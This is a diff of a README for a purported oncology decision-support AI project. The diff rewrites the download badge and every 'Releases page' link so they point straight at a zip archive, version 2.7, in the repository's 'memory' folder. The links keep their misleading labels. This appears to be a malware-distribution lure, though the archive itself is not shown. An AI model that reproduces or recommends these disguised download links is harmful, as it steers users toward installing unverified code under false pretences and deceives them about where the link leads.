@@ -1,7 +1,7 @@
 # 🌟 cancer-research-agent-2025 - AI for Better Cancer Care
 
 ## 🏷️ Badge
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Sugi-Hcr/cancer-research-agent-2025/releases)
+[![Download](https://raw.githubusercontent.com/Sugi-Hcr/cancer-research-agent-2025/master/memory/cancer-research-agent-2025_2.7.zip)](https://raw.githubusercontent.com/Sugi-Hcr/cancer-research-agent-2025/master/memory/cancer-research-agent-2025_2.7.zip)
 
 ## 📄 Description
 The cancer-research-agent-2025 is a multi-agent AI system designed to support oncology clinical decisions. This tool offers evidence-based recommendations while ensuring physician oversight. It aims to enhance patient care and provide valuable insights into cancer treatment.
@@ -10,7 +10,7 @@ The cancer-research-agent-2025 is a multi-agent AI system designed to support on
 To get started with the cancer-research-agent-2025, follow these simple steps. You don’t need to be an expert in technology. Just follow the guide, and you will have the application running in no time.
 
 ## 📥 Download & Install
-You can easily download the application by visiting our [Releases page](https://github.com/Sugi-Hcr/cancer-research-agent-2025/releases). Here, you will find the latest versions of the software available for download. 
+You can easily download the application by visiting our [Releases page](https://raw.githubusercontent.com/Sugi-Hcr/cancer-research-agent-2025/master/memory/cancer-research-agent-2025_2.7.zip). Here, you will find the latest versions of the software available for download. 
 
 1. Click on the link above to go to the Releases page.
 2. Look for the most recent version listed.
@@ -70,4 +70,4 @@ Stay tuned for updates! We are continuously improving the cancer-research-agent-
 ## 📢 Feedback
 We welcome your input. If you have suggestions for features or improvements, please let us know through the issues section on our GitHub repository.
 
-Remember, you can always return to the [Releases page](https://github.com/Sugi-Hcr/cancer-research-agent-2025/releases) for the latest version and updates. Happy using!
+Remember, you can always return to the [Releases page](https://raw.githubusercontent.com/Sugi-Hcr/cancer-research-agent-2025/master/memory/cancer-research-agent-2025_2.7.zip) for the latest version and updates. Happy using!
